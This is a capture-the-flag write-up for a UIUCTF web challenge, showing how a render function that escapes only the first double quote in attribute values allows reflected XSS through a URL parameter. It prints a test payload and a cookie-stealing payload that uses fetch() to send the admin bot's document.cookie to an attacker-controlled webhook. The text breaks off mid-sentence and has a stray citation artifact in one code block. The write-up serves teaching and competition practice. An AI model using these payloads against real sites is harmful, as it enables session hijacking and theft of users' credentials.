*With this ship I have the entire universe at my fingertips.*

Hi everyone, this is the first and easiest in a series of four sci-fi-inspired cosmic-web challenges from uiuctf. I only solved the first three, while my teammate simonedimaria worked on the fourth one, so I will only be tackling those.

First of all, let's take a second to appreciate the homepage of the challenge.

Straight out of last-century digital retrofuturism, System Shock or Neuromancer come to mind.

## Full diagnostic sweep of the mainframe

There's an *Admin Bot* link at the top, which points us in the direction of XSS.

That's cool and all, but what can we actually interact with? Let's open those ominous Astra Main Frame modules at the bottom:

Looks like we can leave a message for the crew, and it will appear under **Messages** at the bottom. Hmm, looks suspicious, let's pull up the ship's source code:

```ts
// module.tsx
const Module = ({
  id,
  crewMessage,
}: {
  id: number;
  crewMessage: string | null | undefined;
}) => {
  // ...
  <form class="mt-4" method="GET">
    <label for="message" class="block text-sm mb-1">
      Crew Message:
    </label>
    <input
      id="message"
      name="message"
      type="text"
      class="w-full border border-green-400 bg-black text-green-400 px-2 py-1 text-xs"
      placeholder={
        crewMessage
          ? `Update your message: ${crewMessage}`
          : "Enter a message for the crew"
      }
    />
  </form>
  // ...
};
:contentReference[oaicite:2]{index=2}
```

`crewMessage` is taken directly from `index.tsx`'s `const crewMessage = new URL(req.url).searchParams.get("message");` and interpolated into the *placeholder*.
Diving deeper into how all of this gets rendered onto the page:

```ts
import { escapeHTML } from "bun";

export function render(element: any): string {
  if (typeof element === "string" || typeof element === "number") {
    return escapeHTML(element);
  }
//...
  const propString = props
    ? Object.entries(props)
        .filter(([key]) => key !== "children")
        .map(([key, value]) => {
          if (typeof value === "boolean") {
            return value ? key : "";
          }
          // Here is where double quotes are improperly escaped
          return `${key}="${String(value).replace('"', "&quot;")}"`;
        })
        .filter(Boolean)
        .join(" ")
    : "";

  const openTag = propString ? `<${type} ${propString}>` : `<${type}>`;
  return `${openTag}${children}</${type}>`;
}
```

The render function employs Bun's `escapeHTML`,  which makes the following replacements:
- `"` becomes `"&quot;"`
- `&` becomes `"&amp;"`
- `'` becomes `"&#x27;"`
- `<` becomes `"&lt;"`
- `>` becomes `"&gt;"`

however, it only does so for strings and numbers; for attributes, a much weaker substitution is in place:

```ts
return `${key}="${String(value).replace('"', "&quot;")}"`;
```
but `replace` only takes care of the first instance of the character in a string.

## Initiating the breach protocol

Knowing all this, and with a bit of trial and error, we can craft a working payload:

```js
crewMessage = img"" /><img src=x onerror="alert(1)" x="
```

During serialization:
- the first `"` in `img""` becomes `&quot;`
- the second `"` closes the `img` attribute

the final markup becomes:

```js
<input â€¦ placeholder="Update your message: img&quot;"
/>
<img src=x onerror="alert(1)" x=>
```

Now it's only a matter of adapting it to our purposes:

```js
img"" /><img src=x onerror="fetch(\'%s?c=\'+encodeURIComponent(document.cookie))" x="
```

Finally, we encode it into the full URL and send a POST request with the link to the Admin Bot to visit the page and retrieve the flag, which is in the bot's cookies, by forwarding it to our webhook:
